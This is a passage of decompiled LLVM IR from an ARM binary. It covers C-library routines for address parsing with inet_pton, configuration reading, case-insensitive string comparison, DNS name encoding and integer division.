  %v1_20f80 = inttoptr i32 %v0_20f80 to i32*
  %v2_20f80 = load i32, i32* %v1_20f80, align 4
  store i32 %v2_20f80, i32* %r3.global-to-local, align 4
  %v4_20f80 = add i32 %v0_20f80, 4
  store i32 %v4_20f80, i32* @r5, align 4
  %v2_20f84 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_20f84, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_20f8c = load i32, i32* @r7, align 4
  %v2_20f8c = inttoptr i32 %v1_20f8c to i32*
  store i32 %v2_20f80, i32* %v2_20f8c, align 4
  %v0_20f90 = load i32, i32* @lr, align 4
  %v1_20f90 = load i32, i32* @ip, align 4
  %v2_20f90 = add i32 %v1_20f90, 4
  %v3_20f90 = inttoptr i32 %v2_20f90 to i32*
  store i32 %v0_20f90, i32* %v3_20f90, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_20f98 = load i32, i32* @r8, align 4
  %v7_20f98 = icmp eq i32 %v0_20f98, 2
  %v0_20f9c = load i32, i32* @r5, align 4
  %v1_20f9c = load i32, i32* @r7, align 4
  %v2_20f9c = add i32 %v1_20f9c, 4
  %v3_20f9c = inttoptr i32 %v2_20f9c to i32*
  store i32 %v0_20f9c, i32* %v3_20f9c, align 4
  %v0_20fa0 = load i32, i32* @ip, align 4
  %v1_20fa0 = load i32, i32* @r7, align 4
  %v2_20fa0 = add i32 %v1_20fa0, 16
  %v3_20fa0 = inttoptr i32 %v2_20fa0 to i32*
  store i32 %v0_20fa0, i32* %v3_20fa0, align 4
  %v0_20fa4 = load i32, i32* @sl, align 4
  %v1_20fa4 = load i32, i32* %r2.global-to-local, align 4
  %v2_20fa4 = add i32 %v1_20fa4, 24
  %v3_20fa4 = inttoptr i32 %v2_20fa4 to i32*
  store i32 %v0_20fa4, i32* %v3_20fa4, align 4
  br i1 %v7_20f98, label %dec_label_pc_20fac, label %dec_label_pc_20fdc

dec_label_pc_20fac:                               ; preds = %dec_label_pc_20f80
  %v3_20fac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_20fac, i32* %r3.global-to-local, align 4
  %v0_20fb0 = load i32, i32* @r8, align 4
  %v1_20fb4 = inttoptr i32 %v3_20fac to i32*
  %v2_20fb4 = load i32, i32* %v1_20fb4, align 4
  store i32 %v2_20fb4, i32* %r1.global-to-local, align 4
  %v0_20fb8 = load i32, i32* @sl, align 4
  store i32 %v0_20fb8, i32* %r2.global-to-local, align 4
  %v3_20fbc = inttoptr i32 %v2_20fb4 to i8*
  %v4_20fbc = call i32 @inet_pton(i32 %v0_20fb0, i8* %v3_20fbc, i32 %v0_20fb8)
  %tmp23 = icmp slt i32 %v4_20fbc, 1
  br i1 %tmp23, label %dec_label_pc_2101c, label %dec_label_pc_20fc8

dec_label_pc_20fc8:                               ; preds = %dec_label_pc_20fac
  %v0_20fcc = load i32, i32* @r7, align 4
  %v2_20fcc = inttoptr i32 %tmp7 to i32*
  store i32 %v0_20fcc, i32* %v2_20fcc, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_20fd4 = load i32, i32* @r8, align 4
  %v1_20fd4 = load i32, i32* @r7, align 4
  %v2_20fd4 = add i32 %v1_20fd4, 8
  %v3_20fd4 = inttoptr i32 %v2_20fd4 to i32*
  store i32 %v0_20fd4, i32* %v3_20fd4, align 4
  %v0_21014.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_21010

dec_label_pc_20fdc:                               ; preds = %dec_label_pc_20f80
  %v0_20fdc = load i32, i32* @r8, align 4
  %v7_20fdc = icmp eq i32 %v0_20fdc, 10
  br i1 %v7_20fdc, label %dec_label_pc_20fe4, label %dec_label_pc_2101c

dec_label_pc_20fe4:                               ; preds = %dec_label_pc_20fdc
  %v3_20fe4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_20fe4, i32* %r3.global-to-local, align 4
  %v1_20fec = inttoptr i32 %v3_20fe4 to i32*
  %v2_20fec = load i32, i32* %v1_20fec, align 4
  store i32 %v2_20fec, i32* %r1.global-to-local, align 4
  %v0_20ff0 = load i32, i32* @sl, align 4
  store i32 %v0_20ff0, i32* %r2.global-to-local, align 4
  %v3_20ff4 = inttoptr i32 %v2_20fec to i8*
  %v4_20ff4 = call i32 @inet_pton(i32 10, i8* %v3_20ff4, i32 %v0_20ff0)
  %tmp24 = icmp slt i32 %v4_20ff4, 1
  br i1 %tmp24, label %dec_label_pc_2101c, label %dec_label_pc_21000

dec_label_pc_21000:                               ; preds = %dec_label_pc_20fe4
  store i32 %tmp7, i32* @ip, align 4
  %v0_21004 = load i32, i32* @r8, align 4
  %v1_21004 = load i32, i32* @r7, align 4
  %v2_21004 = add i32 %v1_21004, 8
  %v3_21004 = inttoptr i32 %v2_21004 to i32*
  store i32 %v0_21004, i32* %v3_21004, align 4
  %v0_21008 = load i32, i32* @r7, align 4
  %v1_21008 = load i32, i32* @ip, align 4
  %v2_21008 = inttoptr i32 %v1_21008 to i32*
  store i32 %v0_21008, i32* %v2_21008, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_21010

dec_label_pc_21010:                               ; preds = %dec_label_pc_20fc8, %dec_label_pc_21000
  %v0_21014 = phi i32 [ %v0_21014.pre, %dec_label_pc_20fc8 ], [ 16, %dec_label_pc_21000 ]
  store i32 0, i32* @sb, align 4
  %v1_21014 = load i32, i32* @r7, align 4
  %v2_21014 = add i32 %v1_21014, 12
  %v3_21014 = inttoptr i32 %v2_21014 to i32*
  store i32 %v0_21014, i32* %v3_21014, align 4
  br label %dec_label_pc_21044

dec_label_pc_2101c:                               ; preds = %dec_label_pc_20fdc, %dec_label_pc_20fe4, %dec_label_pc_20fac
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_21020

dec_label_pc_21020:                               ; preds = %dec_label_pc_20f70.backedge, %dec_label_pc_20f3c, %dec_label_pc_2101c, %dec_label_pc_20ecc
  %v0_21020 = load i32, i32* @r6, align 4
  store i32 %v2_20ed4, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_20f08, i32* %r3.global-to-local, align 4
  %v4_21030 = inttoptr i32 %v0_21020 to i32*
  %v5_21030 = call i32 @__GI_config_read(i32* %v4_21030, i32 %v2_20ed4, i32 459270, i32 %v0_20f08)
  %v2_21034 = icmp eq i32 %v5_21030, 0
  br i1 %v2_21034, label %dec_label_pc_2103c, label %dec_label_pc_20f1c

dec_label_pc_2103c:                               ; preds = %dec_label_pc_21020
  %v0_2103c = load i32, i32* @fp, align 4
  %v7_2103c = icmp eq i32 %v0_2103c, 1
  br i1 %v7_2103c, label %dec_label_pc_2104c, label %dec_label_pc_21044

dec_label_pc_21044:                               ; preds = %dec_label_pc_2103c, %dec_label_pc_21010
  %v0_21044 = load i32, i32* @r6, align 4
  %v1_21048 = inttoptr i32 %v0_21044 to i32*
  %v2_21048 = call i32 @__GI_config_close(i32* %v1_21048)
  br label %dec_label_pc_2104c

dec_label_pc_2104c:                               ; preds = %dec_label_pc_20f1c, %.thread, %dec_label_pc_2103c, %dec_label_pc_20eb0, %dec_label_pc_21044
  %v0_2104c = load i32, i32* @sb, align 4
  store i32 %v3_20e54, i32* @r4, align 4
  store i32 %v9_20e54, i32* @r6, align 4
  store i32 %v12_20e54, i32* @r7, align 4
  store i32 %v15_20e54, i32* @r8, align 4
  store i32 %v18_20e54, i32* @sb, align 4
  store i32 %v24_20e54, i32* @fp, align 4
  ret i32 %v0_2104c

; uselistorder directives
  uselistorder i32 %v0_20f70.be, { 1, 0 }
  uselistorder i32 %v0_20f08, { 1, 0 }
  uselistorder i32 %v2_20ed4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 12, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 25, 27, 28, 29, 30, 31, 32, 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i16 8, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i16* @global_var_32088.1320, { 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 32, 72, 71, 70, 69, 68, 67, 66, 50, 49, 48, 75, 74, 113, 45, 59, 44, 43, 42, 110, 109, 61, 106, 112, 111, 60, 73, 41, 40, 57, 58, 56, 33, 39, 55, 52, 51, 38, 65, 64, 37, 108, 107, 105, 104, 103, 102, 2, 86, 24, 79, 28, 15, 14, 23, 22, 85, 84, 83, 82, 76, 13, 7, 6, 81, 12, 11, 10, 89, 78, 21, 63, 62, 100, 101, 20, 19, 95, 1, 46, 87, 80, 18, 30, 77, 90, 47, 16, 31, 36, 35, 34, 17, 99, 98, 0, 4, 94, 29, 93, 27, 88, 54, 53, 26, 25, 92, 91, 9, 8, 5, 3, 97, 96 }
  uselistorder i32 34, { 7, 8, 9, 10, 2, 3, 0, 5, 12, 4, 13, 11, 1, 6 }
  uselistorder i32 129, { 0, 21, 15, 16, 17, 13, 14, 18, 9, 19, 20, 10, 11, 12, 3, 4, 5, 1, 2, 7, 8, 22, 6 }
  uselistorder i32* @fp, { 60, 61, 62, 63, 72, 73, 74, 75, 76, 77, 78, 79, 80, 0, 85, 86, 87, 88, 89, 90, 91, 92, 93, 5, 6, 144, 145, 81, 82, 83, 84, 94, 95, 96, 97, 98, 99, 64, 65, 66, 67, 68, 69, 70, 71, 7, 8, 1, 127, 129, 128, 130, 2, 3, 113, 114, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 131, 132, 133, 134, 135, 136, 143, 142, 137, 138, 139, 140, 141, 146, 4 }
  uselistorder label %dec_label_pc_2104c, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_21020, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_2101c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_21010, { 1, 0 }
  uselistorder label %dec_label_pc_20f70.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_20f54, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_21088

dec_label_pc_21088:                               ; preds = %dec_label_pc_210b4, %entry
  %v1_210cc8 = phi i32 [ %v1_210cc9, %dec_label_pc_210b4 ], [ 0, %entry ]
  %v0_210bc = phi i32 [ %v1_210bc, %dec_label_pc_210b4 ], [ %arg2, %entry ]
  %v0_210c0 = phi i32 [ %v1_210c0, %dec_label_pc_210b4 ], [ %tmp, %entry ]
  %v9_21088 = icmp eq i32 %v0_210c0, %v0_210bc
  %.pre = inttoptr i32 %v0_210c0 to i8*
  br i1 %v9_21088, label %dec_label_pc_210b4, label %dec_label_pc_21090

dec_label_pc_21090:                               ; preds = %dec_label_pc_21088
  %v2_21090 = load i8, i8* %.pre, align 1
  %v3_21090 = zext i8 %v2_21090 to i32
  %v1_21094 = inttoptr i32 %v0_210bc to i8*
  %v2_21094 = load i8, i8* %v1_21094, align 1
  %v3_21094 = zext i8 %v2_21094 to i32
  %v4_21098 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 1144) to i32*), align 4
  %v2_2109c = mul nuw nsw i32 %v3_21094, 2
  %v2_210a0 = mul nuw nsw i32 %v3_21090, 2
  %v2_210a4 = add i32 %v4_21098, %v2_2109c
  %v3_210a4 = inttoptr i32 %v2_210a4 to i16*
  %v4_210a4 = load i16, i16* %v3_210a4, align 2
  %v6_210a4 = sext i16 %v4_210a4 to i32
  %v2_210a8 = add i32 %v4_21098, %v2_210a0
  %v3_210a8 = inttoptr i32 %v2_210a8 to i16*
  %v4_210a8 = load i16, i16* %v3_210a8, align 2
  %v6_210a8 = sext i16 %v4_210a8 to i32
  %v2_210ac = sub nsw i32 %v6_210a8, %v6_210a4
  %v9_210ac = icmp eq i16 %v4_210a8, %v4_210a4
  br i1 %v9_210ac, label %dec_label_pc_210b4, label %dec_label_pc_210c8

dec_label_pc_210b4:                               ; preds = %dec_label_pc_21088, %dec_label_pc_21090
  %v1_210cc9 = phi i32 [ %v2_210ac, %dec_label_pc_21090 ], [ %v1_210cc8, %dec_label_pc_21088 ]
  %v2_210b4 = load i8, i8* %.pre, align 1
  %v2_210b8 = icmp eq i8 %v2_210b4, 0
  %v1_210bc = add i32 %v0_210bc, 1
  %v1_210c0 = add i32 %v0_210c0, 1
  store i32 %v1_210c0, i32* @ip, align 4
  br i1 %v2_210b8, label %dec_label_pc_210c8, label %dec_label_pc_21088

dec_label_pc_210c8:                               ; preds = %dec_label_pc_210b4, %dec_label_pc_21090
  %v1_210cc = phi i32 [ %v1_210cc9, %dec_label_pc_210b4 ], [ %v2_210ac, %dec_label_pc_21090 ]
  ret i32 %v1_210cc

; uselistorder directives
  uselistorder i32 %v1_210c0, { 1, 0 }
  uselistorder i32 %v2_210ac, { 1, 0 }
  uselistorder i32 %v0_210c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_210b4, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_210d8 = load i32, i32* @r4, align 4
  store i32 %v3_210d8, i32* %stack_var_-32, align 4
  %v6_210d8 = load i32, i32* @r5, align 4
  %v9_210d8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_210e0 = load i32, i32* @r1, align 4
  store i32 %v0_210e0, i32* %r8.global-to-local, align 4
  %v0_210e4 = load i32, i32* @r2, align 4
  store i32 %v0_210e4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_2114c23 = icmp slt i8* %arg1, null
  store i1 %v1_2114c23, i1* %cpsr_n.global-to-local, align 1
  %v2_2114c24 = icmp eq i8* %arg1, null
  store i1 %v2_2114c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2114c24, label %dec_label_pc_21164, label %dec_label_pc_21158

dec_label_pc_210f0:                               ; preds = %dec_label_pc_21158
  %v2_210f0 = call i32 @__GI_strchr(i32 %v0_210f026, i32 46)
  store i32 %v2_210f0, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_210f4 = icmp slt i32 %v2_210f0, 0
  store i1 %v1_210f4, i1* %cpsr_n.global-to-local, align 1
  %v2_210f4 = icmp eq i32 %v2_210f0, 0
  store i1 %v2_210f4, i1* %cpsr_z.global-to-local, align 1
  %v0_210f8 = load i32, i32* @r4, align 4
  %v2_210f8 = sub i32 %v2_210f0, %v0_210f8
  store i32 %v2_210f8, i32* @r5, align 4
  br i1 %v2_210f4, label %dec_label_pc_21100, label %dec_label_pc_2110c

dec_label_pc_21100:                               ; preds = %dec_label_pc_210f0
  %v1_21100 = inttoptr i32 %v0_210f8 to i8*
  %v3_21104 = call i32 @strlen(i8* %v1_21100)
  %sext = mul i32 %v3_21104, 16777216
  %v1_21108 = sdiv i32 %sext, 16777216
  store i32 %v1_21108, i32* @r5, align 4
  %v0_21118.pre = load i32, i32* @r4, align 4
  %v0_21128.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2110c

dec_label_pc_2110c:                               ; preds = %dec_label_pc_210f0, %dec_label_pc_21100
  %v0_21128 = phi i32 [ %v2_210f0, %dec_label_pc_210f0 ], [ %v0_21128.pre, %dec_label_pc_21100 ]
  %v0_21118 = phi i32 [ %v0_210f8, %dec_label_pc_210f0 ], [ %v0_21118.pre, %dec_label_pc_21100 ]
  %v0_21138 = phi i32 [ %v2_210f8, %dec_label_pc_210f0 ], [ %v1_21108, %dec_label_pc_21100 ]
  %v0_2110c = load i32, i32* %sl.global-to-local, align 4
  %v1_2110c = add i32 %v0_2110c, 1
  store i32 %v1_2110c, i32* %r7.global-to-local, align 4
  %v1_21110 = load i32, i32* %sb.global-to-local, align 4
  %v2_21110 = sub i32 %v1_21110, %v0_2110c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_21114 = icmp slt i32 %v0_21138, 0
  store i1 %v1_21114, i1* %cpsr_n.global-to-local, align 1
  %v2_21114 = icmp eq i32 %v0_21138, 0
  store i1 %v2_21114, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_21118, i32* @r1, align 4
  %v0_2111c = load i32, i32* %r8.global-to-local, align 4
  %v2_2111c = add i32 %v0_2111c, %v1_2110c
  store i32 %v2_2111c, i32* @r0, align 4
  store i32 %v0_21138, i32* @r2, align 4
  %v1_21124 = add i32 %v2_21110, -1
  store i32 %v1_21124, i32* @r3, align 4
  %v1_21128 = add i32 %v0_21128, 1
  store i32 %v1_21128, i32* @r4, align 4
  br i1 %v2_21114, label %dec_label_pc_21178, label %dec_label_pc_21130

dec_label_pc_21130:                               ; preds = %dec_label_pc_2110c
  %v2_21130 = sub i32 %v0_21138, %v1_21124
  %v3_21130 = icmp ult i32 %v0_21138, %v1_21124
  %v4_21130 = xor i32 %v1_21124, %v0_21138
  %v5_21130 = xor i32 %v2_21130, %v0_21138
  %v6_21130 = and i32 %v5_21130, %v4_21130
  %v7_21130 = icmp slt i32 %v6_21130, 0
  store i1 %v7_21130, i1* %cpsr_v.global-to-local, align 1
  %v8_21130 = icmp slt i32 %v2_21130, 0
  store i1 %v8_21130, i1* %cpsr_n.global-to-local, align 1
  %v9_21130 = icmp eq i32 %v0_21138, %v1_21124
  store i1 %v9_21130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_21130, label %dec_label_pc_21138, label %dec_label_pc_21178

dec_label_pc_21138:                               ; preds = %dec_label_pc_21130
  %v1_21138 = trunc i32 %v0_21138 to i8
  %v4_21138 = add i32 %v0_2111c, %v0_2110c
  %v5_21138 = inttoptr i32 %v4_21138 to i8*
  store i8 %v1_21138, i8* %v5_21138, align 1
  %v0_2113c = call i32 @memcpy()
  store i32 %v0_2113c, i32* @r0, align 4
  %v0_21140 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_21140 = icmp slt i32 %v0_21140, 0
  store i1 %v1_21140, i1* %cpsr_n.global-to-local, align 1
  %v2_21140 = icmp eq i32 %v0_21140, 0
  store i1 %v2_21140, i1* %cpsr_z.global-to-local, align 1
  %v0_21144 = load i32, i32* @r5, align 4
  %v1_21144 = load i32, i32* %r7.global-to-local, align 4
  %v2_21144 = add i32 %v1_21144, %v0_21144
  store i32 %v2_21144, i32* %sl.global-to-local, align 4
  br i1 %v2_21140, label %dec_label_pc_21164, label %dec_label_pc_21138.dec_label_pc_2114c_crit_edge

dec_label_pc_21138.dec_label_pc_2114c_crit_edge:  ; preds = %dec_label_pc_21138
  %v0_2114c.pre = load i32, i32* @r4, align 4
  store i32 %v0_2114c.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_2114c = icmp slt i32 %v0_2114c.pre, 0
  store i1 %v1_2114c, i1* %cpsr_n.global-to-local, align 1
  %v2_2114c = icmp eq i32 %v0_2114c.pre, 0
  store i1 %v2_2114c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2114c, label %dec_label_pc_21164, label %dec_label_pc_21158

dec_label_pc_21158:                               ; preds = %entry, %dec_label_pc_21138.dec_label_pc_2114c_crit_edge
  %v0_210f026 = phi i32 [ %v0_2114c.pre, %dec_label_pc_21138.dec_label_pc_2114c_crit_edge ], [ %tmp, %entry ]
  %v5_2116c525 = phi i32 [ %v2_21144, %dec_label_pc_21138.dec_label_pc_2114c_crit_edge ], [ 0, %entry ]
  %v1_21158 = inttoptr i32 %v0_210f026 to i8*
  %v2_21158 = load i8, i8* %v1_21158, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2115c = icmp eq i8 %v2_21158, 0
  store i1 %v2_2115c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2115c, label %dec_label_pc_21164, label %dec_label_pc_210f0

dec_label_pc_21164:                               ; preds = %dec_label_pc_21138.dec_label_pc_2114c_crit_edge, %dec_label_pc_21138, %dec_label_pc_21158, %entry
  %v8_21170 = phi i32 [ 0, %entry ], [ %v5_2116c525, %dec_label_pc_21158 ], [ %v2_21144, %dec_label_pc_21138 ], [ %v2_21144, %dec_label_pc_21138.dec_label_pc_2114c_crit_edge ]
  %v0_21164 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_21164 = icmp slt i32 %v0_21164, 0
  store i1 %v1_21164, i1* %cpsr_n.global-to-local, align 1
  %v2_21164 = icmp eq i32 %v0_21164, 0
  store i1 %v2_21164, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_21164, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_21164
  %v6_2116c = add i32 %v8_21170, 1
  store i32 %v6_2116c, i32* @r0, align 4
  %v7_21170 = load i32, i32* %r8.global-to-local, align 4
  %v9_21170 = add i32 %v7_21170, %v8_21170
  %v10_21170 = inttoptr i32 %v9_21170 to i8*
  store i8 0, i8* %v10_21170, align 1
  %v0_21174.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_21174.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_21174.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_21164, %bb
  %v2_21174 = phi i1 [ %v2_21174.pre, %bb ], [ false, %dec_label_pc_21164 ]
  %v1_21174 = phi i1 [ %v1_21174.pre, %bb ], [ %v1_21164, %dec_label_pc_21164 ]
  %v0_21174 = phi i1 [ %v0_21174.pre, %bb ], [ %v2_21164, %dec_label_pc_21164 ]
  %v3_21174 = xor i1 %v2_21174, %v1_21174
  %v4_21174 = or i1 %v0_21174, %v3_21174
  br i1 %v4_21174, label %dec_label_pc_21178, label %.dec_label_pc_2117c_crit_edge

.dec_label_pc_2117c_crit_edge:                    ; preds = %bb22
  %v1_21180.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_2117c

dec_label_pc_21178:                               ; preds = %dec_label_pc_21130, %dec_label_pc_2110c, %bb22
  br label %dec_label_pc_2117c

dec_label_pc_2117c:                               ; preds = %.dec_label_pc_2117c_crit_edge, %dec_label_pc_21178
  %v1_21180 = phi i32 [ %v1_21180.pre, %.dec_label_pc_2117c_crit_edge ], [ -1, %dec_label_pc_21178 ]
  %v2_2117c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_2117c, i32* @r4, align 4
  store i32 %v6_210d8, i32* @r5, align 4
  store i32 %v9_210d8, i32* @r6, align 4
  ret i32 %v1_21180

; uselistorder directives
  uselistorder i32 %v0_21164, { 0, 2, 1 }
  uselistorder i32 %v0_2114c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_21140, { 1, 0 }
  uselistorder i32 %v2_21130, { 1, 0 }
  uselistorder i32 %v1_21124, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_21138, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_21108, { 1, 0 }
  uselistorder i1 %v2_2114c24, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*)* @strlen, { 17, 14, 13, 12, 11, 10, 15, 29, 7, 9, 8, 1, 16, 28, 27, 26, 24, 25, 23, 22, 21, 20, 32, 31, 30, 19, 18, 6, 4, 5, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 11, 10, 9, 8, 2, 1, 0, 7, 6, 5, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 4, 3 }
  uselistorder i32 46, { 0, 1, 5, 6, 7, 8, 9, 4, 2, 3 }
  uselistorder label %dec_label_pc_2117c, { 1, 0 }
  uselistorder label %dec_label_pc_21178, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_21164, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_21158, { 1, 0 }
  uselistorder label %dec_label_pc_2110c, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_21184 = load i32, i32* @r1, align 4
  %v1_21184 = icmp slt i32 %v0_21184, 0
  %v2_21184 = icmp eq i32 %v0_21184, 0
  %v2_21188 = xor i32 %v0_21184, %arg1
  br i1 %v2_21184, label %dec_label_pc_2129c, label %dec_label_pc_21190

dec_label_pc_21190:                               ; preds = %entry
  br i1 %v1_21184, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_21190
  %v2_21190 = sub i32 0, %v0_21184
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_21190, %bb
  %v1_2125c = phi i32 [ %v2_21190, %bb ], [ %v0_21184, %dec_label_pc_21190 ]
  %v1_21194 = add i32 %v1_2125c, -1
  %v7_21194 = icmp eq i32 %v1_2125c, 1
  br i1 %v7_21194, label %dec_label_pc_2123c, label %dec_label_pc_2119c

dec_label_pc_2119c:                               ; preds = %thread-pre-split
  %v1_2119c = icmp slt i32 %arg1, 0
  br i1 %v1_2119c, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_2119c
  %v2_211a0 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_2119c, %bb85
  %v0_21290 = phi i32 [ %arg1, %dec_label_pc_2119c ], [ %v2_211a0, %bb85 ]
  %v3_211a4 = icmp uge i32 %v0_21290, %v1_2125c
  %v9_211a4 = icmp eq i32 %v0_21290, %v1_2125c
  %v2_211a8 = xor i1 %v3_211a4, true
  %v3_211a8 = or i1 %v9_211a4, %v2_211a8
  br i1 %v3_211a8, label %dec_label_pc_21248, label %dec_label_pc_211ac

dec_label_pc_211ac:                               ; preds = %bb86
  %v2_211ac = and i32 %v1_21194, %v1_2125c
  %v4_211ac = icmp eq i32 %v2_211ac, 0
  br i1 %v4_211ac, label %dec_label_pc_21258, label %dec_label_pc_211b4

dec_label_pc_211b4:                               ; preds = %dec_label_pc_211ac
  %v3_211b4 = icmp ult i32 %v1_2125c, 536870912
  br i1 %v3_211b4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_211b4
  %v4_211b8 = mul i32 %v1_2125c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_211b4, %.thread
  %v0_211d8.pr40.ph = phi i32 [ %v4_211b8, %.thread ], [ %v1_2125c, %dec_label_pc_211b4 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_211b4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_211d8.pr40 = phi i32 [ %v4_211cc, %bb89 ], [ %v0_211d8.pr40.ph, %.preheader.preheader ]
  %v1_211d0 = phi i32 [ %v4_211d0, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_211c4 = icmp ugt i32 %v0_211d8.pr40, 268435455
  br i1 %v2_211c4, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_211d8thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_211c8 = icmp ult i32 %v0_211d8.pr40, %v0_21290
